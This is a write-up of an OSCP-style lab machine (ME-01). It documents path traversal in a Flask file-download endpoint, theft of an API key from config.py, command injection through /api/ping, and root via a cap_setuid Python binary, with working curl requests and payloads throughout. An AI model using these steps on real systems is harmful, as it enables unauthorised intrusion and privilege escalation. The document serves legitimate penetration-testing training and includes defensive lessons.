---
type: machine-overview
project: OSCP-Exam-PoC
machine: ME-01
difficulty: Medium
status: completed
initial_user: svc
initial_access: Path Traversal / Arbitrary File Read
privilege_escalation: CAP_SETUID
target: x.x.x.x
http_port: PORT_I
user_access: confirmed
root_access: confirmed
credential_discovery: API Key Disclosure
remote_execution: OS Command Injection
application_server: Gunicorn
privileged_binary: /usr/local/bin/pyadmin
capability: cap_setuid=ep
user_flag_submitted: true
root_flag_submitted: true
tags:
  - oscp
  - me-01
  - medium
  - path-traversal
  - arbitrary-file-read
  - api-key-disclosure
  - command-injection
  - linux-capabilities
  - cap-setuid
---

# ME-01 — Machine Overview

> **Flag completion:** User and root flags obtained and submitted (confirmed by the examination participant). Public value: `IT{FLAG-SECRET}`.

## 1. Machine Information

|Property|Value|
|---|---|
|Machine ID|ME-01|
|Difficulty|Medium|
|Target IP|`x.x.x.x`|
|HTTP Port|`PORT_I`|
|Application|IT GATE File Service|
|Web Server|Gunicorn|
|Backend|Python application|
|Initial Access|Path Traversal|
|Credential Discovery|Application configuration disclosure|
|Remote Execution|OS command injection|
|Initial Execution Account|`svc`|
|UID/GID|`1000:1000`|
|Operating System|Debian GNU/Linux 13 (Trixie)|
|Kernel|`6.8.0-147-generic`|
|Hostname|`medium`|
|Working Directory|`/opt/svcapp`|
|Privilege Escalation|Linux capability abuse|
|Vulnerable Executable|`/usr/local/bin/pyadmin`|
|Capability|`cap_setuid=ep`|
|Final Privilege|`root`|
|Machine Status|Completed|

## 2. Examination Objectives

### User-Level Objective

The initial challenge required obtaining user-level access and submitting:

```
user.txt
```

The investigation identified the service account:

```
svc
```

The user flag was retrieved from:

```
/home/svc/user.txt
```

The objective was completed and the flag submitted successfully.

### Root-Level Objective

The second challenge required escalating privileges and retrieving:

```
/root/root.txt
```

The objective was completed by exploiting the `CAP_SETUID` capability assigned to a custom Python executable.

**Root flag:**

```
IT{FLAG-SECRET}
```

The flag was successfully submitted.

## 3. Attack Chain

<figure class="attack-chain-figure">
  <picture>
    <source media="(max-width: 520px)" type="image/svg+xml" srcset="/diagrams/me-01-attack-chain-mobile.svg" />
    <img src="/diagrams/me-01-attack-chain.svg" alt="ME-01 complete seventeen-stage attack chain: IT GATE File Service, /api/download path traversal and arbitrary file read, svc account, source disclosure, config.py API key retrieval, authenticated /api/ping command injection, RCE as svc, Linux capability enumeration, pyadmin cap_setuid=ep, Python os.setuid(0), captured UID and EUID 0 inside the container, root flag retrieval and submission." width="760" height="2511" loading="lazy" decoding="async" />
  </picture>
  <figcaption>All 17 original stages preserved, including API-key recovery and <code>CAP_SETUID</code> escalation. The user flag was retrieved through arbitrary file read at <code>/home/svc/user.txt</code>. Captured UID/EUID 0 confirms root privileges in the application container, <strong>not a host escape</strong>; flag values are redacted.</figcaption>
</figure>

## 4. Reconnaissance Summary

### 4.1 Initial Application

The machine exposed a single web application:

```
http://x.x.x.x:PORT_I
```

The landing page identified the application as:

```
IT GATE File Service
```

It exposed two endpoints.

|Endpoint|Function|Security Mechanism|
|---|---|---|
|`/api/download?file=welcome.txt`|Download files from a public share|No authentication|
|`/api/ping?host=1.1.1.1`|Internal network diagnostics|Requires `X-API-Key`|

The download endpoint became the initial attack surface.

The diagnostics endpoint later became the command-execution vector.

### 4.2 Service Response

The initial successful request returned:

```
HTTP/1.1 200 OK
Server: gunicorn
Content-Type: application/octet-stream
Content-Length: 161
```

The application identified the public-share directory as the intended location for downloads.

This provided the first indication that a file-resolution vulnerability might expose files outside the intended directory.

## 5. Initial Access Summary

### 5.1 Path Traversal

The `/api/download` endpoint accepted a filename through the `file` parameter.

The application implementation was later recovered from:

```
/opt/svcapp/app.py
```

Relevant source:

```
BASE = os.path.dirname(os.path.abspath(__file__))
PUBLIC = os.path.join(BASE, "public")
```

The vulnerable implementation:

```
f = request.args.get("file", "")
path = os.path.join(PUBLIC, f)

try:
    with open(path, "rb") as fh:
        data = fh.read()
except OSError:
    abort(404)

return Response(data, mimetype="application/octet-stream")
```

The application joined user-controlled input to the public directory without normalizing the path or checking whether the resulting path remained inside that directory.

This enabled directory traversal and arbitrary file disclosure.

### 5.2 Confirm Arbitrary File Read

The first confirmed traversal test targeted:

```
/etc/passwd
```

Request:

```
curl -i --get \
  --data-urlencode 'file=../../../../etc/passwd' \
  'http://x.x.x.x:PORT_I/api/download'
```

Response:

```
HTTP/1.1 200 OK
Server: gunicorn
Content-Type: application/octet-stream
Content-Length: 876
```

The response contained Linux account entries, including:

```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
svc:x:1000:1000::/home/svc:/bin/bash
```

This identified the service account:

```
svc
```

Important account information:

|Property|Value|
|---|---|
|Username|`svc`|
|UID|`1000`|
|GID|`1000`|
|Home Directory|`/home/svc`|
|Shell|`/bin/bash`|

### 5.3 Retrieve the User Flag

The identified flag location was:

```
/home/svc/user.txt
```

The file-read vulnerability provided access to the user flag.

The objective was completed successfully.

**Flag outcome:** Obtained and submitted (participant-confirmed). Public value: `IT{FLAG-SECRET}`.

See [[Difficulty Levels/Medium/ME-01/user]].

## 6. Application Source Code Analysis

Rather than guessing how the application worked, the investigation moved to inspecting its source code.

### 6.1 Gunicorn Process Information

The process command line was recovered through:

```
/proc/self/cmdline
```

Captured output:

```
/usr/local/bin/python3.11
/usr/local/bin/gunicorn
--access-logfile -
-w 2
-b 0.0.0.0:5000
app:app
```

The environment identified:

```
PWD=/opt/svcapp
USER=svc
HOSTNAME=medium
```

Combining these findings:

|Property|Value|
|---|---|
|Application Directory|`/opt/svcapp`|
|Python Version|3.11.18|
|Application Module|`app`|
|Application Object|`app`|
|WSGI Server|Gunicorn|
|Workers|2|
|Internal Bind Address|`0.0.0.0:5000`|

This led to the source file:

```
/opt/svcapp/app.py
```

### 6.2 Read app.py

The file was retrieved using the confirmed traversal vulnerability.

Important imports:

```
import os
import subprocess

from flask import Flask, request, Response, abort

from config import API_KEY
```

This established that the application imported its API key from a separate configuration module.

### 6.3 Identify Command Injection in the Source

The diagnostics endpoint contained:

```
@app.route("/api/ping")
def ping():
    if request.headers.get("X-API-Key") != API_KEY:
        abort(401)

    host = request.args.get("host", "")

    out = subprocess.getoutput("ping -c 1 -W 1 " + host)

    return Response(out, mimetype="text/plain")
```

The vulnerable operation was:

```
subprocess.getoutput("ping -c 1 -W 1 " + host)
```

The application concatenated user-controlled input into a shell command.

No input validation or safe argument separation was implemented.

This confirmed a command-injection vulnerability.

### 6.4 Inspect the Configuration File

The source code explicitly imported:

```
from config import API_KEY
```

The configuration file was therefore identified as:

```
/opt/svcapp/config.py
```

Its contents were recovered:

```
# Internal service configuration.
# NOTE: do not expose this file publicly.
API_KEY = "<recovered API key>"
DEBUG = False
```

The actual API key is kept in the examination record and is reproduced in the user-phase walkthrough.

**Finding:** The path traversal vulnerability exposed the authentication secret required by the second endpoint.

### 6.5 Investigate the Canary

The application source also contained:

```
def canary():
    try:
        with open(os.path.join(BASE, "canary.txt")) as fh:
            return fh.read().strip()
    except OSError:
        return ""
```

The homepage embedded the token inside an HTML comment:

```
<!-- svcapp build token: ... -->
```

The associated canary value was a decoy, not the actual examination flag.

It was correctly identified as a false lead and excluded from the successful attack chain.

## 7. API Authentication and Command Execution

### 7.1 Initial Authentication Problem

The first manually constructed API-key requests returned:

```
HTTP/1.1 401 UNAUTHORIZED
```

The verbose curl output confirmed that the request contained the authentication header.

The investigation then eliminated manual copying as a source of error by extracting the key directly from the recovered configuration file.

### 7.2 Automated API-Key Extraction

The working extraction command was:

```
BASE='http://x.x.x.x:PORT_I'

API_KEY=$(curl -fsS --get \
  --data-urlencode 'file=../config.py' \
  "$BASE/api/download" |
  sed -n 's/^API_KEY = "\(.*\)"$/\1/p')
```

The extracted key length was:

```
30 characters
```

The application accepted the automatically extracted value.

A normal diagnostics request returned:

```
HTTP/1.1 200 OK
```

And successfully executed the intended ping operation.

### 7.3 Demonstrate Command Injection

The next test appended a harmless identity command to the `host` parameter:

```
host=127.0.0.1; id
```

The application constructed:

```
ping -c 1 -W 1 127.0.0.1; id
```

The response included:

```
uid=1000(svc) gid=1000(svc) groups=1000(svc)
```

This confirmed remote operating-system command execution.

The execution context was:

```
svc
```

The API-key-protected endpoint was therefore converted into an authenticated remote command-execution primitive.

See [[Difficulty Levels/Medium/ME-01/user]].

## 8. Target Environment and Privilege Enumeration

### 8.1 Execution Environment

The following information was recovered through command injection:

```
medium
Linux medium 6.8.0-147-generic #147-Ubuntu SMP PREEMPT_DYNAMIC Thu Sep 24 11:33:16 UTC 2026 x86_64 GNU/Linux
```

Operating-system information:

```
PRETTY_NAME="Debian GNU/Linux 13 (trixie)"
NAME="Debian GNU/Linux"
VERSION_ID="13"
VERSION="13 (trixie)"
VERSION_CODENAME=trixie
DEBIAN_VERSION_FULL=13.7
ID=debian
```

The working directory was:

```
/opt/svcapp
```

The root filesystem contained:

```
.dockerenv
```

This was a strong indication that the application was running inside a Docker container.

The investigation did not establish a host-container escape, and none was needed to complete the root objective inside the challenge environment.

### 8.2 SUID Enumeration

The following command was executed:

```
find / -type f -perm -4000 -ls 2>/dev/null
```

The output included standard system SUID binaries such as:

```
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/umount
/usr/bin/su
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
```

No unusual SUID binary provided the intended route.

### 8.3 Linux Capabilities

The next enumeration command was:

```
getcap -r / 2>/dev/null
```

Captured result:

```
/usr/local/bin/pyadmin cap_setuid=ep
```

This was the decisive privilege-escalation finding.

### 8.4 Sudo Enumeration

The following check was performed:

```
sudo -n -l 2>&1
```

Response:

```
/bin/sh: 1: sudo: not found
```

Sudo was not installed.

This reinforced the need to investigate Linux capabilities rather than continue searching for sudo permissions.

### 8.5 Capability Finding

The discovered capability was:

```
cap_setuid=ep
```

It provided the executable with the permitted and effective `CAP_SETUID` capability.

This capability allows a process to change its user IDs, including changing its UID to root when the required privilege is available.

The executable was:

```
/usr/local/bin/pyadmin
```

## 9. Privilege Escalation Summary

### 9.1 Inspect pyadmin

The executable was inspected with:

```
ls -l /usr/local/bin/pyadmin
readlink -f /usr/local/bin/pyadmin
/usr/local/bin/pyadmin --version
```

Captured output:

```
-rwxr-xr-x 1 root root 14472 Nov 3 11:50 /usr/local/bin/pyadmin

/usr/local/bin/pyadmin

Python 3.11.18
```

The `file` utility was unavailable inside the container, but the executable identified itself as Python 3.11.18.

The important distinction was that the executable was not SUID. Its privilege came from the Linux capability assigned to it.

### 9.2 Test CAP_SETUID

Python exposes the operating-system UID functions through its `os` module.

The test executed:

```
import os

print(os.getuid(), os.geteuid())
os.setuid(0)
print(os.getuid(), os.geteuid())
```

The command was executed through the vulnerable diagnostics endpoint using:

```
/usr/local/bin/pyadmin -c "import os; print(os.getuid(), os.geteuid()); os.setuid(0); print(os.getuid(), os.geteuid())"
```

Captured output:

```
1000 1000
0 0
```

This confirmed that the process successfully changed both its real and effective UIDs to zero.

**Root privileges confirmed.**

### 9.3 Retrieve the Root Flag

The final command executed the Python interpreter with the capability and read the root flag:

```
/usr/local/bin/pyadmin -c "import os; os.setuid(0); print(open('/root/root.txt').read())"
```

The command was delivered through the authenticated `/api/ping` endpoint.

The final root flag was:

```
IT{FLAG-SECRET}
```

The flag was submitted successfully.

See [[Difficulty Levels/Medium/ME-01/root]].

## 10. Difficulties Encountered

|Difficulty|Evidence|Impact|Resolution|
|---|---|---|---|
|ISP HTTP interception|`307 Temporary Redirect` through `Via: 1.0 middlebox`|Direct curl requests were redirected to the ISP's VDSL page|Configured a system-level VPN route|
|Burp/VPN conflict|Packet capture and VPN routing complications|Burp was impractical for this environment|Switched to curl after discussing the situation with the instructor|
|Windscribe architecture confusion|Initial download endpoint returned HTML|Invalid `.deb` download|Used the official AMD64 release asset|
|Package validation|HTML file was initially mistaken for a package|Installation had to be stopped|Verified package format and SHA-256|
|Multiple VPN clients|Academy OpenVPN already active|Potential routing conflict|Inspected routes and used a narrower routing configuration|
|API key transcription|Initial requests returned 401|Command injection test could not proceed|Extracted the key automatically using curl and sed|
|Canary false flag|Build token looked potentially useful|False lead|Identified it as a decoy|
|Missing `file` utility|`/bin/sh: 1: file: not found`|One inspection command failed|Used available commands instead|
|No sudo|`sudo: not found`|Standard sudo enumeration unavailable|Enumerated Linux capabilities|

**Attribution note:** The ISP redirect is directly evidenced. The exact cause of the ISP interception was not independently established beyond the observed middlebox response.

## 11. Technical Findings

|Finding ID|Finding|Evidence|Result|
|---|---|---|---|
|ME-01-F01|Path traversal|Unrestricted `os.path.join()` with user input|Arbitrary file read|
|ME-01-F02|Account discovery|`/etc/passwd`|Identified `svc`|
|ME-01-F03|Application source disclosure|`/opt/svcapp/app.py`|Identified application logic|
|ME-01-F04|API-key disclosure|`/opt/svcapp/config.py`|Recovered API authentication secret|
|ME-01-F05|Command injection|`subprocess.getoutput()` with concatenated input|Remote command execution|
|ME-01-F06|Container environment|`.dockerenv`|Container context identified|
|ME-01-F07|Linux capability misconfiguration|`pyadmin cap_setuid=ep`|UID-changing capability|
|ME-01-F08|Root escalation|Python `os.setuid(0)`|Root achieved|

## 12. Reusable Techniques

### Path Traversal and Arbitrary File Read

Relevant concepts:

- Trace how application input becomes a filesystem path.
    
- Inspect `os.path.join()` usage.
    
- Identify missing canonicalization and containment validation.
    
- Retrieve application source and configuration files.
    
- Use `/proc` to inspect process information.
    

### API-Key Discovery

Relevant concepts:

- Inspect application imports.
    
- Identify configuration modules.
    
- Distinguish environment variables from application-defined configuration.
    
- Avoid treating unrelated environment variables as secrets without evidence.
    
- Extract recovered secrets programmatically to eliminate transcription errors.
    

### OS Command Injection

Relevant concepts:

- Identify shell execution through application code.
    
- Understand the difference between argument execution and shell-based execution.
    
- Use harmless commands such as `id` to establish execution context.
    
- Preserve the original request and response.
    

### Linux CAP_SETUID Privilege Escalation

Relevant concepts:

- Enumerate file capabilities with `getcap`.
    
- Understand permitted and effective capability sets.
    
- Identify executables that can use `CAP_SETUID`.
    
- Inspect custom Python interpreters and their assigned capabilities.
    
- Understand the relationship between UID, EUID, and root-level file access.
    

## 13. Evidence Index

|Evidence|Description|Status|
|---|---|---|
|Initial application page|IT GATE File Service|Recorded|
|Welcome file response|HTTP 200 and file contents|Recorded|
|`/etc/passwd` traversal|Complete response|Recorded|
|`svc` account|UID/GID 1000|Confirmed|
|`/proc/self/environ`|Process environment|Recorded|
|`/proc/self/cmdline`|Gunicorn invocation|Recorded|
|`app.py`|Application source|Recorded|
|`config.py`|API-key configuration|Recorded|
|Canary token|False flag|Identified|
|API authentication|HTTP 200 after automatic extraction|Recorded|
|Command injection|`id` output as `svc`|Confirmed|
|SUID enumeration|Complete output|Recorded|
|Capability enumeration|`pyadmin cap_setuid=ep`|Confirmed|
|pyadmin inspection|Python 3.11.18, root-owned executable|Recorded|
|UID transition|`1000 1000` to `0 0`|Confirmed|
|Root flag|`IT{FLAG-SECRET}`|Recorded and submitted|
|User flag|`/home/svc/user.txt`| Obtained and submitted (participant-confirmed) |

## 14. Lessons Learned

1. **File download endpoints must enforce path containment.** Joining user-controlled input to a public directory without canonicalization can expose the entire application filesystem.
    
2. **Read the application source when arbitrary file disclosure makes it available.** Understanding the actual implementation is more reliable than guessing how an endpoint works.
    
3. **Configuration files are high-value targets.** The API key was not in the process environment; it was imported from `config.py`.
    
4. **Do not confuse canary values with actual flags.** The `build:token` and application canary were decoys.
    
5. **Separate authentication testing from injection testing.** The initial 401 responses meant the application never processed the supplied host value.
    
6. **Automate secret extraction when transcription becomes error-prone.** The curl and sed pipeline resolved the API-key problem without unnecessary parsing complexity.
    
7. **Sudo and SUID are not the only privilege-escalation mechanisms.** The decisive ME-01 finding was a Linux capability.
    
8. **Inspect the exact executable carrying a capability.** `CAP_SETUID` was assigned to a custom Python interpreter, making Python's UID-changing functionality directly relevant.
    
9. **Understand the effective privilege transition.** The test changed both real and effective UIDs from 1000 to zero.
    
10. **Network tooling must adapt to the environment.** Burp was not practical in the existing VPN setup, but curl provided precise and reproducible HTTP requests.
    
11. **Do not over-investigate unrelated hypotheses.** The canary and initial API-key transcription issue were distractions. Returning to source code and actual responses restored a clear attack path.
    

## 15. Related Documentation

- [[ME-01 Overview]]
    
- [[Difficulty Levels/Medium/ME-01/user]]
    
- [[Difficulty Levels/Medium/ME-01/root]]
    
- [[Methodology/Reconnaissance]]
    
- [[Methodology/Web Enumeration]]
    
- [[Methodology/Initial Access]]
    
- [[Methodology/Linux Privilege Escalation]]
    
- [[Difficulties & Lessons/Network and ISP Restrictions]]
    
- [[Difficulties & Lessons/VPN Routing and Reverse Shells]]
    
- [[HTTP Client and Connectivity Failures]]
    
- [[Reusable PoCs/Linux Privilege Escalation/CAP_SETUID]]
    

## Documentation Completion Checklist

- Target information recorded
    
- Application endpoints documented
    
- Path traversal documented
    
- Application source analyzed
    
- API-key disclosure documented
    
- Command injection documented
    
- User execution context recorded
    
- SUID enumeration recorded
    
- CAP_SETUID finding documented
    
- pyadmin inspection documented
    
- UID transition confirmed
    
- Root flag recorded
    
- Root submission confirmed
    
- Raw user flag response attached
    
- Original HTTP evidence files attached
    
- Supporting screenshots attached
    

**Machine result:** User and root objectives completed successfully. ME-01 demonstrates a complete chain from arbitrary file read through authenticated command injection to root privilege escalation using `CAP_SETUID`.